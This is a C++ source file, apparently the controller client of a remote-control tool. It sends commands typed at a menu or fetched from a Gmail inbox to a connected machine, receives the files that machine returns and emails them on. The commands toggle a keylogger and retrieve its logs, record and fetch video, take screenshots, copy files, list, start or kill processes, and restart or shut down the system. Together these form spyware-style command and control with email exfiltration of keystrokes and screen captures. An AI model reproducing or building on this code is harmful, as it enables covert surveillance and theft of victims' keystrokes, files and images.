#include "client.h"
#include "fstream"
#include "sstream"
#include <chrono>
#include <thread>

#ifdef _WIN32
#include <conio.h>
#else
#include <sys/select.h>
#include <termios.h>
#include <unistd.h>
#endif
namespace fs = std::filesystem;

bool isKeyboardHit()
{
#ifdef _WIN32
  return _kbhit();
#else
  // The Linux/macOS code does not need to change at all.
  struct timeval tv;
  fd_set fds;
  tv.tv_sec = 0;
  tv.tv_usec = 0;
  FD_ZERO(&fds);
  FD_SET(STDIN_FILENO, &fds);
  select(STDIN_FILENO + 1, &fds, NULL, NULL, &tv);
  return (FD_ISSET(STDIN_FILENO, &fds));
#endif
}

bool Client::Init(std::string hostIP, std::string _port)
{
  if (hostIP.empty())
    serverHost = "localhost";
  else
    serverHost = hostIP;
  if (_port.empty())
  {
    port = PORT;
  }
  else
    port = _port;
  if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
  {
    std::cerr << "WSAStartup failed\n";
    return 0;
  }
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  hints.ai_flags = AI_PASSIVE;

  int rc = getaddrinfo(serverHost.c_str(), port.c_str(), &hints, &res);
  if (rc != 0)
  {
    std::cerr << "Get address info failed (" << rc << ")\n";
    WSACleanup();
    return 0;
  }

  connSock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
  if (connSock == INVALID_SOCKET)
  {
    std::cerr << "Create socket failed\n";
    freeaddrinfo(res);
    WSACleanup();
    return 0;
  }

  if (connect(connSock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR)
  {
    std::cerr << "Unable to connect to server\n";
    closesocket(connSock);
    freeaddrinfo(res);
    WSACleanup();
    return 0;
  }
  return 1;
}

void Client::GetCommand()
{
  using namespace std::chrono_literals;
  auto lastEmailCheck = std::chrono::steady_clock::now();
  const auto emailCheckInterval = 3s;
  while (true)
  {
    if (isKeyboardHit())
    {
      int choice;
      std::string path;
      std::string name;
      std::cin >> choice;
      if (std::cin.fail())
      {
        std::cout << "Invalid input. Please enter a number.\n";
        std::cin.clear();
        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
        continue;
      }

      switch (choice)
      {
      case 0: // EXIT
        this->command = "EXIT";
        std::cout << "Exiting client...\n";
        break;
      case 1: // COPYFILE
        this->command = "COPYFILE";
        std::cout << "Enter file path to copy: ";
        std::cin >> path;
        this->command += " " + path;
        break;

      case 2: // TOGGLE_VIDEO
        this->command = "TOGGLE_VIDEO";
        std::cout << "Toggling video recording...\n";
        break;

      case 3: // GET_VIDEO
        this->command = "GET_VIDEO";
        std::cout << "Retrieving recorded video...\n";
        break;

      case 4: // TOGGLE_KEYLOGGER
        this->command = "TOGGLE_KEYLOGGER";
        std::cout << "Toggling keylogger...\n";
        break;

      case 5: // GET_KEYLOGGER
        this->command = "GET_KEYLOGGER";
        std::cout << "Retrieving keylogger logs...\n";
        break;

      case 6: // GET_RUNNING_PROCESS
        this->command = "GET_RUNNING_PROCESS";
        std::cout << "Listing running processes...\n";
        break;

      case 7: // RUN_PROCESS
        this->command = "RUN_PROCESS";
        std::cout << "Enter process name to run (name or path): ";
        std::cin >> name;
        this->command += " " + name;
        break;
      case 8: // SHUTDOWN_PROCESS
        this->command = "SHUTDOWN_PROCESS";
        std::cout << "Enter process name to shutdown (name or path): ";
        std::cin >> name;
        this->command += " " + name;
        break;

      case 9: // SLEEP
        this->command = "SLEEP";
        std::cout << "Putting system to sleep...\n";
        break;

      case 10: // RESTART
        this->command = "RESTART";
        std::cout << "Restarting system...\n";
        break;

      case 11: // SHUTDOWN
        this->command = "SHUTDOWN";
        std::cout << "Shutting down system...\n";
        break;

      case 12: // EXIT
        this->command = "TAKE_SCREENSHOT";
        std::cout << "Taking screenshot...\n";
        break;

      default:
        std::cout << "Invalid choice. Please try again.\n";
        break;
      }
      if (!this->command.empty())
      {
        fromEmail = false;
        return;
      }
    }

    auto now = std::chrono::steady_clock::now();
    if (now - lastEmailCheck >= emailCheckInterval)
    {
      GmailClient gmail;
      std::string check_IP;
      gmail.GetLatestEmailBody(check_IP, this->command, this->receiver);
      if (!this->command.empty() && check_IP == serverHost)
      {
        std::cout << "Valid command received via email: " << this->command << std::endl;
        fromEmail = true;
        this->command.erase(std::remove(this->command.begin(), this->command.end(), '\r'), this->command.end());
        this->command.erase(std::remove(this->command.begin(), this->command.end(), '\n'), this->command.end());
        this->command.erase(std::remove(this->command.begin(), this->command.end(), '\0'), this->command.end());
        return;
      }
      else
      {
        this->command.clear();
        this->receiver.clear();
      }

      lastEmailCheck = now;
    }
    std::this_thread::sleep_for(100ms);
  }
}
void Client::SendCommand()
{
  if (!send(connSock, command.c_str(), command.size(), 0))
  {
    std::cerr << "Send failed\n";
  }
}

void Client::ProcessCommand()
{
  if (command == "" || command.empty())
    return;
  SendCommand();
  std::stringstream ss(command);
  std::string com, body;
  ss >> com >> body;
  if (com == "COPYFILE")
  {
    ReceiveFile("../data/copyfile");
    if (fromEmail)
    {
      GmailClient gmail;
      gmail.SendEmailAttachment(receiver, "COPIED_FILE", "File: ", "../data/copyfile/" + filename);
    }
  }
  else if (com == "GET_VIDEO")
  {
    ReceiveFile("../data/video");
    if (fromEmail)
    {
      GmailClient gmail;
      gmail.SendVideoThroughEmail(receiver, "../data/video/" + filename);
    }
  }
  else if (com == "GET_KEYLOGGER")
  {
    ReceiveFile("../data/keylogger");
    if (fromEmail)
    {
      GmailClient gmail;
      gmail.SendEmailAttachment(receiver, "KEYLOG_FILE", "File: ", "../data/keylogger/" + filename);
    }
  }
  else if (com == "GET_RUNNING_PROCESS")
  {
    ReceiveFile("../data/process");
    if (fromEmail)
    {
      GmailClient gmail;
      gmail.SendEmailAttachment(receiver, "PROCESS_FILE", "File: ", "../data/process/" + filename);
    }
  }
  else if (com == "TAKE_SCREENSHOT")
  {
    ReceiveFile("../data/screenshot");
    if (fromEmail)
    {
      GmailClient gmail;
      gmail.SendEmailAttachment(receiver, "SCREENSHOT_FILE", "File: ", "../data/screenshot/" + filename);
    }
  }
}

void Client::ReceiveFile(std::string pathFolder)
{
  auto read_line_from_socket = [this]() -> std::string
  {
    std::string line;
    char c;
    while (recv(this->connSock, &c, 1, 0) > 0)
    {
      if (c == '\n')
      {
        break;
      }
      line += c;
    }
    return line;
  };

  std::string path_header = read_line_from_socket();
  if (path_header.rfind("ERROR:", 0) == 0)
  {
    std::cerr << "Server reported an error: " << path_header.substr(6)
              << std::endl;
    return;
  }

  std::string size_header = read_line_from_socket();
  if (path_header.rfind("PATH:", 0) != 0 ||
      size_header.rfind("SIZE:", 0) != 0)
  {
    std::cerr << "Protocol error: Received invalid headers from server."
              << std::endl;
    return;
  }
  std::string relative_path_str = path_header.substr(5);
  long long file_size = 0;
  try
  {
    file_size = std::stoll(size_header.substr(5));
  }
  catch (const std::invalid_argument &e)
  {
    std::cerr << "Protocol error: Invalid file size received." << std::endl;
    return;
  }

  if (file_size == 0)
  {
    std::cout << "Server sent an empty file. Nothing to save." << std::endl;
    return;
  }
  std::string server_path_str = path_header.substr(5);
  fs::path received_path(server_path_str);
  filename = received_path.filename().string();
  fs::path final_destination_path = fs::path(pathFolder) / filename;
  fs::path destination_dir = final_destination_path.parent_path();
  try
  {
    if (!fs::exists(destination_dir))
    {
      fs::create_directories(destination_dir);
      std::cout << "Created directory: " << destination_dir.string()
                << std::endl;
    }
  }
  catch (const fs::filesystem_error &e)
  {
    std::cerr << "Error creating directories: " << e.what() << std::endl;
    return;
  }
  std::ofstream outfile(final_destination_path, std::ios::binary);
  if (!outfile.is_open())
  {
    std::cerr << "Failed to open file for writing: " << final_destination_path
              << std::endl;
    return;
  }

  std::cout << "Receiving file to: " << final_destination_path << " ("
            << file_size << " bytes)" << std::endl;

  std::vector<char> buffer(8192);
  long long total_bytes_received = 0;
  int bytes_read = 0;

  while (total_bytes_received < file_size)
  {
    bytes_read = recv(connSock, buffer.data(), buffer.size(), 0);

    if (bytes_read > 0)
    {
      outfile.write(buffer.data(), bytes_read);
      total_bytes_received += bytes_read;
    }
    else if (bytes_read == 0)
    {
      std::cerr << "Connection closed by server prematurely." << std::endl;
      break;
    }
    else
    {
      std::cerr << "Socket error during transfer: " << WSAGetLastError()
                << std::endl;
      break;
    }
  }

  outfile.close();

  if (total_bytes_received == file_size)
  {
    std::cout << "File transfer completed successfully." << std::endl;
  }
  else
  {
    std::cerr << "File transfer incomplete. Received " << total_bytes_received
              << " of " << file_size << " bytes." << std::endl;
  }
}

// void Client::sendFile(std::string pathFile)
// {
//   GmailClient gmail;
//   gmail.SendEmailAttachment("");
// }

void Client::Shutdown()
{
  shutdown(connSock, SD_SEND);
  closesocket(connSock);
  WSACleanup();
}
